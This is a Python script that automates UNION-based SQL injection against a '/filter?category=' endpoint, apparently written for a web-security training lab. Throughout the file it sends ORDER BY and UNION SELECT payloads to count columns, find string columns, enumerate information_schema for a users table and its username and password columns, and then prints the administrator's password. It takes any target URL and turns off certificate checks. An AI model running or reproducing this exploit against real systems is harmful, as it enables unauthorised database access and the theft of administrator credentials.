import argparse
import sys
import urllib3
import requests
import urllib.parse
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_proxy_config():
    return {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }


def perform_request(base_url, sql_payload, proxies):
    endpoint = "/filter?category=Accessories"
    full_url = f"{base_url}{endpoint}{urllib.parse.quote_plus(sql_payload)}"
    print(f"    ➤ Sending payload: {sql_payload}")
    response = requests.get(full_url, verify=False, proxies=proxies)
    return response.text


def find_column_count(base_url, proxies):
    print("(+) Determining number of columns using ORDER BY...\n")
    endpoint = "/filter?category="
    for i in range(1, 50):
        payload = f"' ORDER BY {i}--"
        full_url = f"{base_url}{endpoint}{urllib.parse.quote_plus(payload)}"
        print(f"    ➤ Testing payload: {payload}")
        try:
            response = requests.get(full_url, verify=False, proxies=proxies)
            if "Internal Server Error" in response.text:
                print(
                    f"\n(✓) Found error at column {i}, so total columns = {i - 1}\n")
                return i - 1
        except requests.RequestException as err:
            print(f"(-) Request failed: {err}")
            break
    return None


def find_text_columns(base_url, num_columns, proxies, test_string):
    print(f"(+) Identifying string-compatible columns...\n")
    endpoint = "/filter?category=Accessories"
    quoted_string = f"'{test_string}'"
    string_columns = []

    for i in range(num_columns):
        payload_list = ['null'] * num_columns
        payload_list[i] = quoted_string
        payload = "' UNION SELECT " + ','.join(payload_list) + "--"
        full_url = f"{base_url}{endpoint}{urllib.parse.quote_plus(payload)}"
        print(f"    ➤ Testing column {i + 1} with payload: {payload}")
        try:
            response = requests.get(full_url, verify=False, proxies=proxies)
            if test_string in response.text:
                print(f"    ✓ Column {i + 1} accepts string data.\n")
                string_columns.append(i + 1)
            else:
                print(f"    ✗ Column {i + 1} did not reflect string.\n")
        except requests.RequestException as err:
            print(f"(-) Request failed at column {i + 1}: {err}")
            continue

    return string_columns


def find_users_table(base_url, proxies, num_columns, string_columns):
    print("(+) Searching for users table...\n")
    payload_list = ['null'] * num_columns
    payload_list[string_columns[0] - 1] = 'table_name'
    payload = "' UNION SELECT " + \
        ','.join(payload_list) + " FROM information_schema.tables--"
    html = perform_request(base_url, payload, proxies)
    soup = BeautifulSoup(html, 'html.parser')
    match = soup.find(string=re.compile(r'.*users.*', re.IGNORECASE))
    if match:
        table_name = match.strip()
        print(f"(✓) Found users table: {table_name}\n")
        return table_name
    else:
        print("(-) Could not find a users table.")
        return None


def find_user_columns(base_url, proxies, num_columns, string_columns, table_name):
    print(f"(+) Searching for columns in table '{table_name}'...\n")
    payload_list = ['null'] * num_columns
    payload_list[string_columns[0] - 1] = 'column_name'
    payload = f"' UNION SELECT " + \
        ','.join(payload_list) + \
        f" FROM information_schema.columns WHERE table_name = '{table_name}'--"
    html = perform_request(base_url, payload, proxies)
    soup = BeautifulSoup(html, 'html.parser')

    username_col = soup.find(string=re.compile(r'.*username.*', re.IGNORECASE))
    password_col = soup.find(string=re.compile(r'.*password.*', re.IGNORECASE))

    if username_col and password_col:
        print(
            f"(✓) Found columns: {username_col.strip()}, {password_col.strip()}\n")
        return username_col.strip(), password_col.strip()
    else:
        print("(-) Could not find both username and password columns.")
        return None, None


def extract_admin_password(base_url, proxies, num_columns, string_columns, table_name, username_col, password_col):
    print(f"(+) Extracting administrator password from '{table_name}'...\n")
    payload_list = ['null'] * num_columns
    payload_list[string_columns[0] - 1] = username_col
    payload_list[string_columns[1] - 1] = password_col
    payload = "' UNION SELECT " + \
        ','.join(payload_list) + f" FROM {table_name}--"
    html = perform_request(base_url, payload, proxies)
    soup = BeautifulSoup(html, 'html.parser')

    admin_tag = soup.find(string="administrator")
    if admin_tag:
        password_tag = admin_tag.find_next('td')
        if password_tag:
            password = password_tag.get_text(strip=True)
            print(f"(✓) Administrator password: {password}\n")
            return password

    print("(-) Could not find administrator password.")
    return None


def get_cli_args():
    parser = argparse.ArgumentParser(
        description=(
            "Scenario: Extract administrator password using UNION-based SQL injection.\n\n"
            "Example:\n"
            "  python3 union_admin_extractor_verbose.py https://vulnerable-site.com\n"
        ),
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "url", help="Target URL (e.g., https://vulnerable-site.com)")
    return parser.parse_args()


def main():
    proxies = get_proxy_config()
    args = get_cli_args()
    base_url = args.url.strip()

    print(f"(+) Targeting: {base_url}\n")

    num_columns = find_column_count(base_url, proxies)
    if not num_columns:
        print("[-] Could not determine column count.")
        return

    string_columns = find_text_columns(
        base_url, num_columns, proxies, "test123")
    if len(string_columns) < 2:
        print("[-] Need at least two string-compatible columns.")
        return

    users_table = find_users_table(
        base_url, proxies, num_columns, string_columns)
    if not users_table:
        return

    username_col, password_col = find_user_columns(
        base_url, proxies, num_columns, string_columns, users_table)
    if not username_col or not password_col:
        return

    extract_admin_password(base_url, proxies, num_columns,
                           string_columns, users_table, username_col, password_col)


if __name__ == "__main__":
    main()
